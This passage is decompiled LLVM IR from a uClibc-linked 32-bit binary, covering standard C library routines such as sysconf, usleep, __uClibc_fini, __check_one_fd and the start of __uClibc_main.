  br label %dec_label_pc_8054612

dec_label_pc_805460f:                             ; preds = %dec_label_pc_8054534, %dec_label_pc_80544ef, %dec_label_pc_80544c1
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054612

dec_label_pc_8054612:                             ; preds = %dec_label_pc_805460b, %dec_label_pc_80545f2, %dec_label_pc_8054566, %dec_label_pc_805460f
  %v0_805461c = phi i32 [ 0, %dec_label_pc_805460b ], [ %v4_8054602, %dec_label_pc_80545f2 ], [ %v0_805461c.pre, %dec_label_pc_8054566 ], [ -1, %dec_label_pc_805460f ]
  store i32 %v0_8054497, i32* @ebx, align 4
  store i32 %v0_8054496, i32* @esi, align 4
  store i32 %v0_8054495, i32* @edi, align 4
  ret i32 %v0_805461c

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_80545ae, { 1, 0, 2 }
  uselistorder i32 %v2_805459a, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8054531, { 2, 1, 0 }
  uselistorder i32 %v2_80544f0, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_80544d7, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_80544be, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054612, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805460b, { 1, 0 }
  uselistorder label %dec_label_pc_80545eb, { 1, 0 }
  uselistorder label %dec_label_pc_80545e4, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_805463f [
    i32 0, label %dec_label_pc_805464f
    i32 1, label %dec_label_pc_8054734
    i32 2, label %dec_label_pc_8054659
    i32 3, label %dec_label_pc_8054663
    i32 4, label %dec_label_pc_805466d
    i32 5, label %dec_label_pc_8054703
    i32 6, label %dec_label_pc_8054675
    i32 7, label %dec_label_pc_8054635
    i32 8, label %dec_label_pc_8054635
    i32 9, label %dec_label_pc_8054635
    i32 10, label %dec_label_pc_8054635
    i32 11, label %dec_label_pc_8054635
    i32 12, label %dec_label_pc_8054635
    i32 13, label %dec_label_pc_8054635
    i32 14, label %dec_label_pc_8054635
    i32 15, label %dec_label_pc_8054635
    i32 16, label %dec_label_pc_8054635
    i32 17, label %dec_label_pc_8054635
    i32 18, label %dec_label_pc_8054635
    i32 19, label %dec_label_pc_8054635
    i32 20, label %dec_label_pc_8054635
    i32 21, label %dec_label_pc_8054635
    i32 22, label %dec_label_pc_8054635
    i32 23, label %dec_label_pc_8054734
    i32 24, label %dec_label_pc_8054734
    i32 25, label %dec_label_pc_8054740
    i32 26, label %dec_label_pc_8054711
    i32 27, label %dec_label_pc_8054734
    i32 28, label %dec_label_pc_8054687
    i32 29, label %dec_label_pc_805470a
    i32 30, label %dec_label_pc_805467f
    i32 31, label %dec_label_pc_805471f
    i32 32, label %dec_label_pc_8054734
    i32 33, label %dec_label_pc_8054734
    i32 34, label %dec_label_pc_8054734
    i32 35, label %dec_label_pc_8054718
    i32 36, label %dec_label_pc_8054747
    i32 37, label %dec_label_pc_805474e
    i32 38, label %dec_label_pc_8054747
    i32 39, label %dec_label_pc_8054691
    i32 40, label %dec_label_pc_8054755
    i32 41, label %dec_label_pc_8054734
    i32 42, label %dec_label_pc_805471f
    i32 43, label %dec_label_pc_805474e
    i32 44, label %dec_label_pc_805475c
    i32 45, label %dec_label_pc_805474e
    i32 46, label %dec_label_pc_805470a
    i32 47, label %dec_label_pc_805470a
    i32 48, label %dec_label_pc_805470a
    i32 49, label %dec_label_pc_8054734
    i32 50, label %dec_label_pc_8054734
    i32 51, label %dec_label_pc_805470a
    i32 52, label %dec_label_pc_805470a
    i32 53, label %dec_label_pc_8054734
    i32 54, label %dec_label_pc_8054734
    i32 55, label %dec_label_pc_8054734
    i32 56, label %dec_label_pc_8054734
    i32 57, label %dec_label_pc_8054734
    i32 58, label %dec_label_pc_8054734
    i32 59, label %dec_label_pc_8054734
    i32 60, label %dec_label_pc_8054734
    i32 61, label %dec_label_pc_8054734
    i32 62, label %dec_label_pc_8054734
    i32 63, label %dec_label_pc_8054734
    i32 64, label %dec_label_pc_8054734
    i32 65, label %dec_label_pc_8054734
    i32 66, label %dec_label_pc_8054734
    i32 67, label %dec_label_pc_8054635
    i32 68, label %dec_label_pc_8054635
    i32 69, label %dec_label_pc_8054718
    i32 70, label %dec_label_pc_8054718
    i32 71, label %dec_label_pc_8054718
    i32 72, label %dec_label_pc_805471f
    i32 73, label %dec_label_pc_8054726
    i32 74, label %dec_label_pc_805472d
    i32 75, label %dec_label_pc_805469b
    i32 76, label %dec_label_pc_805472d
    i32 77, label %dec_label_pc_8054635
    i32 78, label %dec_label_pc_8054635
    i32 79, label %dec_label_pc_8054635
    i32 80, label %dec_label_pc_8054635
    i32 81, label %dec_label_pc_8054635
    i32 82, label %dec_label_pc_8054635
    i32 83, label %dec_label_pc_8054635
    i32 84, label %dec_label_pc_8054635
    i32 85, label %dec_label_pc_8054734
    i32 86, label %dec_label_pc_8054734
    i32 87, label %dec_label_pc_8054711
    i32 88, label %dec_label_pc_80546a5
    i32 89, label %dec_label_pc_80546af
    i32 90, label %dec_label_pc_8054726
    i32 91, label %dec_label_pc_8054635
    i32 92, label %dec_label_pc_8054635
    i32 93, label %dec_label_pc_8054635
    i32 94, label %dec_label_pc_8054635
    i32 95, label %dec_label_pc_805470a
    i32 96, label %dec_label_pc_8054734
    i32 97, label %dec_label_pc_8054734
    i32 98, label %dec_label_pc_8054635
    i32 99, label %dec_label_pc_8054635
    i32 100, label %dec_label_pc_8054635
    i32 101, label %dec_label_pc_80546b9
    i32 102, label %dec_label_pc_80546fc
    i32 103, label %dec_label_pc_8054739
    i32 104, label %dec_label_pc_8054711
    i32 105, label %dec_label_pc_80546c3
    i32 106, label %dec_label_pc_805471f
    i32 107, label %dec_label_pc_805471f
    i32 108, label %dec_label_pc_8054703
    i32 109, label %dec_label_pc_8054740
    i32 110, label %dec_label_pc_805475c
    i32 111, label %dec_label_pc_80546fc
    i32 112, label %dec_label_pc_8054739
    i32 113, label %dec_label_pc_805475c
    i32 114, label %dec_label_pc_80546cd
    i32 115, label %dec_label_pc_8054755
    i32 116, label %dec_label_pc_8054734
    i32 117, label %dec_label_pc_8054734
    i32 118, label %dec_label_pc_80546d7
    i32 119, label %dec_label_pc_80546e1
    i32 120, label %dec_label_pc_805474e
    i32 121, label %dec_label_pc_8054711
    i32 122, label %dec_label_pc_8054711
    i32 123, label %dec_label_pc_8054711
    i32 124, label %dec_label_pc_8054711
    i32 125, label %dec_label_pc_8054635
    i32 126, label %dec_label_pc_8054635
    i32 127, label %dec_label_pc_8054734
    i32 128, label %dec_label_pc_8054734
    i32 129, label %dec_label_pc_8054635
    i32 130, label %dec_label_pc_8054635
    i32 131, label %dec_label_pc_8054734
    i32 149, label %dec_label_pc_80546e8
  ]

dec_label_pc_8054635:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054761

dec_label_pc_805463f:                             ; preds = %entry
  %v1_805463f = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8054644 = inttoptr i32 %v1_805463f to i32*
  store i32 22, i32* %v1_8054644, align 4
  br label %dec_label_pc_8054734

dec_label_pc_805464f:                             ; preds = %entry
  br label %dec_label_pc_8054761

dec_label_pc_8054659:                             ; preds = %entry
  br label %dec_label_pc_8054761

dec_label_pc_8054663:                             ; preds = %entry
  br label %dec_label_pc_8054761

dec_label_pc_805466d:                             ; preds = %entry
  %v0_8054670 = call i32 @getdtablesize()
  br label %dec_label_pc_8054675

dec_label_pc_8054675:                             ; preds = %entry, %dec_label_pc_805466d
  br label %dec_label_pc_8054761

dec_label_pc_805467f:                             ; preds = %entry
  %v3_8054682 = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8054687

dec_label_pc_8054687:                             ; preds = %entry, %dec_label_pc_805467f
  br label %dec_label_pc_8054761

dec_label_pc_8054691:                             ; preds = %entry
  br label %dec_label_pc_8054761

dec_label_pc_805469b:                             ; preds = %entry
  br label %dec_label_pc_8054761

dec_label_pc_80546a5:                             ; preds = %entry
  br label %dec_label_pc_8054761

dec_label_pc_80546af:                             ; preds = %entry
  br label %dec_label_pc_8054761

dec_label_pc_80546b9:                             ; preds = %entry
  br label %dec_label_pc_8054761

dec_label_pc_80546c3:                             ; preds = %entry
  br label %dec_label_pc_8054761

dec_label_pc_80546cd:                             ; preds = %entry
  br label %dec_label_pc_8054761

dec_label_pc_80546d7:                             ; preds = %entry
  br label %dec_label_pc_8054761

dec_label_pc_80546e1:                             ; preds = %entry
  br label %dec_label_pc_8054761

dec_label_pc_80546e8:                             ; preds = %entry
  %v5_80546ee = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_80546f6 = icmp slt i32 %v5_80546ee, 0
  %v1_80546f8 = icmp eq i1 %v2_80546f6, false
  br i1 %v1_80546f8, label %dec_label_pc_805470a, label %dec_label_pc_8054734

dec_label_pc_80546fc:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054761

dec_label_pc_8054703:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054761

dec_label_pc_805470a:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_80546e8
  br label %dec_label_pc_8054761

dec_label_pc_8054711:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054761

dec_label_pc_8054718:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054761

dec_label_pc_805471f:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054761

dec_label_pc_8054726:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054761

dec_label_pc_805472d:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054761

dec_label_pc_8054734:                             ; preds = %dec_label_pc_80546e8, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_805463f
  br label %dec_label_pc_8054761

dec_label_pc_8054739:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054761

dec_label_pc_8054740:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054761

dec_label_pc_8054747:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054761

dec_label_pc_805474e:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054761

dec_label_pc_8054755:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054761

dec_label_pc_805475c:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8054761

dec_label_pc_8054761:                             ; preds = %dec_label_pc_8054755, %dec_label_pc_805474e, %dec_label_pc_8054747, %dec_label_pc_8054740, %dec_label_pc_8054739, %dec_label_pc_805472d, %dec_label_pc_8054726, %dec_label_pc_805471f, %dec_label_pc_8054718, %dec_label_pc_8054711, %dec_label_pc_8054703, %dec_label_pc_80546fc, %dec_label_pc_805470a, %dec_label_pc_80546e1, %dec_label_pc_80546d7, %dec_label_pc_80546cd, %dec_label_pc_80546c3, %dec_label_pc_80546b9, %dec_label_pc_80546af, %dec_label_pc_80546a5, %dec_label_pc_805469b, %dec_label_pc_8054691, %dec_label_pc_8054687, %dec_label_pc_8054675, %dec_label_pc_8054663, %dec_label_pc_8054659, %dec_label_pc_805464f, %dec_label_pc_8054635, %dec_label_pc_8054734, %dec_label_pc_805475c
  %v0_8054764 = phi i32 [ 255, %dec_label_pc_8054755 ], [ 2048, %dec_label_pc_805474e ], [ 99, %dec_label_pc_8054747 ], [ 20, %dec_label_pc_8054740 ], [ -128, %dec_label_pc_8054739 ], [ 1024, %dec_label_pc_805472d ], [ 4, %dec_label_pc_8054726 ], [ 32, %dec_label_pc_805471f ], [ 256, %dec_label_pc_8054718 ], [ 2147483647, %dec_label_pc_8054711 ], [ 16, %dec_label_pc_8054703 ], [ 127, %dec_label_pc_80546fc ], [ 200112, %dec_label_pc_805470a ], [ 9, %dec_label_pc_80546e1 ], [ 65535, %dec_label_pc_80546d7 ], [ -32768, %dec_label_pc_80546cd ], [ -2147483648, %dec_label_pc_80546c3 ], [ 8, %dec_label_pc_80546b9 ], [ 500, %dec_label_pc_80546af ], [ 4096, %dec_label_pc_80546a5 ], [ 16384, %dec_label_pc_805469b ], [ 1000, %dec_label_pc_8054691 ], [ 32768, %dec_label_pc_8054687 ], [ 6, %dec_label_pc_8054675 ], [ 65536, %dec_label_pc_8054663 ], [ 100, %dec_label_pc_8054659 ], [ 131072, %dec_label_pc_805464f ], [ 1, %dec_label_pc_8054635 ], [ -1, %dec_label_pc_8054734 ], [ 32767, %dec_label_pc_805475c ]
  ret i32 %v0_8054764

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 1000, { 4, 0, 1, 5, 2, 3 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 1, 2, 3, 4 }
  uselistorder i32 -2147483648, { 4, 6, 0, 5, 7, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @__GI_getpagesize, { 1, 0 }
  uselistorder i32 ()* @getdtablesize, { 2, 1, 0 }
  uselistorder i32 149, { 2, 1, 3, 0 }
  uselistorder i32 130, { 1, 0 }
  uselistorder i32 129, { 2, 0, 1 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32 125, { 1, 0 }
  uselistorder i32 124, { 2, 1, 0 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 122, { 1, 0 }
  uselistorder i32 121, { 1, 0 }
  uselistorder i32 119, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 117, { 1, 0 }
  uselistorder i32 115, { 3, 0, 1, 2 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 111, { 1, 0 }
  uselistorder i32 110, { 1, 0 }
  uselistorder i32 109, { 1, 0 }
  uselistorder i32 108, { 1, 0 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 105, { 1, 0 }
  uselistorder i32 103, { 1, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 98, { 1, 0 }
  uselistorder i32 96, { 1, 0 }
  uselistorder i32 95, { 4, 2, 1, 3, 0 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 93, { 1, 0 }
  uselistorder i32 92, { 1, 0 }
  uselistorder i32 91, { 1, 0 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 89, { 1, 0 }
  uselistorder i32 87, { 1, 2, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 85, { 1, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 82, { 1, 0 }
  uselistorder i32 81, { 1, 0 }
  uselistorder i32 79, { 1, 0 }
  uselistorder i32 78, { 1, 0 }
  uselistorder i32 77, { 1, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 74, { 1, 0 }
  uselistorder i32 73, { 1, 0 }
  uselistorder i32 71, { 1, 0 }
  uselistorder i32 70, { 2, 3, 1, 0 }
  uselistorder i32 66, { 1, 0 }
  uselistorder i32 65, { 2, 1, 0, 3, 4 }
  uselistorder i32 63, { 1, 2, 0 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 53, { 2, 1, 0 }
  uselistorder i32 50, { 3, 0, 1, 2 }
  uselistorder i32 49, { 1, 0 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 38, { 2, 3, 1, 0 }
  uselistorder i32 30, { 6, 2, 7, 1, 3, 0, 4, 5 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 26, { 3, 2, 1, 0 }
  uselistorder i32 25, { 1, 2, 0 }
  uselistorder i32 23, { 3, 1, 4, 2, 0 }
  uselistorder i32 19, { 3, 2, 0, 1 }
  uselistorder i32 18, { 1, 0 }
  uselistorder i32 13, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8054761, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8054734, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_805470a, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8054687, { 1, 0 }
  uselistorder label %dec_label_pc_8054675, { 1, 0 }
}

define i32 @usleep(i64 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8054778 = and i64 %arg1, 4294967295
  %v8_8054778 = udiv i64 %v2_8054778, 1000000
  %v9_8054778 = trunc i64 %v8_8054778 to i32
  store i32 %v9_8054778, i32* %stack_var_-8, align 4
  %v2_805478f = bitcast i32* %stack_var_-8 to %timespec*
  %v3_805478f = call i32 @__libc_nanosleep(%timespec* %v2_805478f, i32 0)
  ret i32 %v3_805478f

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054798 = load i32, i32* @ebx, align 4
  store i32 %v0_8054798, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.538 to i32), i32 -134590464), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.538 to i32), i32 -134590464), i32 2), i32 0), label %dec_label_pc_80547ac, label %dec_label_pc_80547b9

dec_label_pc_80547ac:                             ; preds = %entry, %dec_label_pc_80547ac
  %v1_80547b36 = phi i32 [ %v1_80547b3, %dec_label_pc_80547ac ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.538 to i32), i32 -134590464), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_80547b3.539 to i32), i32* %stack_var_-16, align 4
  %v5_80547ac = mul i32 %v1_80547b36, 4
  %v6_80547ac = add i32 %v5_80547ac, ptrtoint (i32* @global_var_805b000.538 to i32)
  %v7_80547ac = inttoptr i32 %v6_80547ac to i32*
  %v8_80547ac = load i32, i32* %v7_80547ac, align 4
  call void @__pseudo_call(i32 %v8_80547ac)
  %v0_80547b3.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80547b3 = add i32 %v0_80547b3.pre, -1
  store i32 %v1_80547b3, i32* %ebx.global-to-local, align 4
  %v10_80547b4 = icmp eq i32 %v0_80547b3.pre, 0
  %v1_80547b7 = icmp eq i1 %v10_80547b4, false
  br i1 %v1_80547b7, label %dec_label_pc_80547ac, label %dec_label_pc_80547b9

dec_label_pc_80547b9:                             ; preds = %dec_label_pc_80547ac, %entry
  %v0_80547b9 = load i32, i32* @global_var_8061774.540, align 4
  %v1_80547be = icmp eq i32 %v0_80547b9, 0
  br i1 %v1_80547be, label %dec_label_pc_80547c4, label %dec_label_pc_80547c2

dec_label_pc_80547c2:                             ; preds = %dec_label_pc_80547b9
  %v0_80547c2 = load i32, i32* %stack_var_-16, align 4
  %v1_80547c2 = call i32 @unknown_0(i32 %v0_80547c2)
  br label %dec_label_pc_80547c4

dec_label_pc_80547c4:                             ; preds = %dec_label_pc_80547c2, %dec_label_pc_80547b9
  %v0_80547c4 = load i32, i32* @global_var_8061778.541, align 8
  %v1_80547ca = icmp eq i32 %v0_80547c4, 0
  br i1 %v1_80547ca, label %dec_label_pc_80547d3, label %dec_label_pc_80547ce

dec_label_pc_80547ce:                             ; preds = %dec_label_pc_80547c4
  %v2_80547d0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80547d0, i32* %ebx.global-to-local, align 4
  %v0_80547d1 = load i32, i32* %stack_var_-16, align 4
  %v1_80547d1 = call i32 @unknown_0(i32 %v0_80547d1)
  br label %dec_label_pc_80547d3

dec_label_pc_80547d3:                             ; preds = %dec_label_pc_80547c4, %dec_label_pc_80547ce
  %v2_80547d3 = load i32, i32* %stack_var_-16, align 4
  %v2_80547d4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80547d4, i32* @edx, align 4
  ret i32 %v2_80547d3

; uselistorder directives
  uselistorder i32 %v1_80547b3, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80547d3, { 1, 0 }
  uselistorder label %dec_label_pc_80547ac, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80547da = load i32, i32* @eax, align 4
  ret i32 %v0_80547da
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80547db = load i32, i32* @esi, align 4
  %v0_80547dc = load i32, i32* @ebx, align 4
  store i32 %v0_80547dc, i32* %stack_var_-8, align 4
  %v0_80547e0 = load i32, i32* @eax, align 4
  store i32 %v0_80547e0, i32* @esi, align 4
  %v0_80547e2 = load i32, i32* @edx, align 4
  store i32 %v0_80547e2, i32* @ebx, align 4
  %v4_80547e7 = call i32 @__libc_fcntl(i32 %v0_80547e0, i32 1, i32 %tmp6)
  %v8_80547ef = icmp eq i32 %v4_80547e7, -1
  %v1_80547f0 = icmp eq i1 %v8_80547ef, false
  br i1 %v1_80547f0, label %dec_label_pc_805480b, label %dec_label_pc_80547f2

dec_label_pc_80547f2:                             ; preds = %entry
  %v0_80547f4 = load i32, i32* @ebx, align 4
  %v5_80547fa = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a6ec.542, i32 0, i32 0), i32 %v0_80547f4)
  %v1_8054802 = load i32, i32* @esi, align 4
  %v12_8054802 = icmp eq i32 %v5_80547fa, %v1_8054802
  br i1 %v12_8054802, label %dec_label_pc_805480b, label %dec_label_pc_8054806

dec_label_pc_8054806:                             ; preds = %dec_label_pc_80547f2
  %v0_8054806 = call i32 @abort()
  br label %dec_label_pc_805480b

dec_label_pc_805480b:                             ; preds = %dec_label_pc_80547f2, %entry, %dec_label_pc_8054806
  %v2_805480b = load i32, i32* %stack_var_-12, align 4
  %v2_805480c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805480c, i32* @ebx, align 4
  store i32 %v0_80547db, i32* @esi, align 4
  ret i32 %v2_805480b

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 4, 1 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 5, 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 0, 5, 9, 8, 7, 6, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_805480b, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_8054812 = load i8, i8* @global_var_806177c.543, align 4
  %v1_8054812 = icmp eq i8 %v0_8054812, 0
  %v1_8054819 = icmp eq i1 %v1_8054812, false
  br i1 %v1_8054819, label %entry.dec_label_pc_805484b_crit_edge, label %dec_label_pc_805481b

entry.dec_label_pc_805484b_crit_edge:             ; preds = %entry
  %v0_805484e.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_805484b

dec_label_pc_805481b:                             ; preds = %entry
  store i8 1, i8* @global_var_806177c.543, align 4
  store i32 4096, i32* @global_var_8061770.465, align 16
  %v0_8054846 = call i32 @_stdio_init()
  br label %dec_label_pc_805484b

dec_label_pc_805484b:                             ; preds = %entry.dec_label_pc_805484b_crit_edge, %dec_label_pc_805481b
  %v0_805484e = phi i32 [ %v0_805484e.pre, %entry.dec_label_pc_805484b_crit_edge ], [ %v0_8054846, %dec_label_pc_805481b ]
  ret i32 %v0_805484e

; uselistorder directives
  uselistorder i8* @global_var_806177c.543, { 1, 0 }
  uselistorder label %dec_label_pc_805484b, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp31, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_8061768.544, align 8
  store i32 %arg6, i32* @global_var_8061778.541, align 8
  %v2_8054886 = mul i32 %arg2, 4
  %v3_8054886 = add i32 %tmp31, %v2_8054886
  store i32 %v3_8054886, i32* %edx.global-to-local, align 4
  %v1_8054889 = add i32 %v3_8054886, 4
  store i32 %v1_8054889, i32* @global_var_806176c.536, align 4
  %v3_8054891 = load i32, i32* %arg3, align 4
  %v14_8054891 = icmp eq i32 %v1_8054889, %v3_8054891
  %v1_8054893 = icmp eq i1 %v14_8054891, false
  br i1 %v1_8054893, label %dec_label_pc_805489b, label %dec_label_pc_8054895

dec_label_pc_8054895:                             ; preds = %entry
  store i32 %v3_8054886, i32* @global_var_806176c.536, align 4
  br label %dec_label_pc_805489b

dec_label_pc_805489b:                             ; preds = %entry, %dec_label_pc_8054895
  %v0_805489b = load i32, i32* @ecx, align 4
  store i32 %v0_805489b, i32* %stack_var_-160, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_80548a0 = ptrtoint i32* %stack_var_-136 to i32
  %v3_80548a5 = bitcast i32* %stack_var_-136 to i8*
  %v4_80548a5 = call i32 @__GI_memset(i8* %v3_80548a5, i32 0, i32 120)
  %v0_80548aa = load i32, i32* @global_var_806176c.536, align 4
  br label %dec_label_pc_80548b2

dec_label_pc_80548b2:                             ; preds = %dec_label_pc_80548b2, %dec_label_pc_805489b
  %v0_80548b2 = phi i32 [ %v1_80548b5, %dec_label_pc_80548b2 ], [ %v0_80548aa, %dec_label_pc_805489b ]
  %v1_80548b2 = inttoptr i32 %v0_80548b2 to i32*
  %v2_80548b2 = load i32, i32* %v1_80548b2, align 4
  %v3_80548b2 = icmp eq i32 %v2_80548b2, 0
  %v1_80548b5 = add i32 %v0_80548b2, 4
  %v1_80548b8 = icmp eq i1 %v3_80548b2, false
  br i1 %v1_80548b8, label %dec_label_pc_80548b2, label %dec_label_pc_80548d9.preheader

dec_label_pc_80548d9.preheader:                   ; preds = %dec_label_pc_80548b2
  store i32 %v1_80548b5, i32* @ebx, align 4
  %v1_80548d91 = inttoptr i32 %v1_80548b5 to i32*
  %v2_80548d92 = load i32, i32* %v1_80548d91, align 4
  %v3_80548d93 = icmp eq i32 %v2_80548d92, 0
  %v1_80548dc10 = icmp eq i1 %v3_80548d93, false
  br i1 %v1_80548dc10, label %dec_label_pc_80548be.lr.ph, label %dec_label_pc_80548de

dec_label_pc_80548be.lr.ph:                       ; preds = %dec_label_pc_80548d9.preheader
  %v3_805489e = ptrtoint i32* %stack_var_-168 to i32
  %v3_80548c9 = add i32 %v3_805489e, 32
  br label %dec_label_pc_80548be

dec_label_pc_80548be:                             ; preds = %dec_label_pc_80548be.lr.ph, %dec_label_pc_80548d6
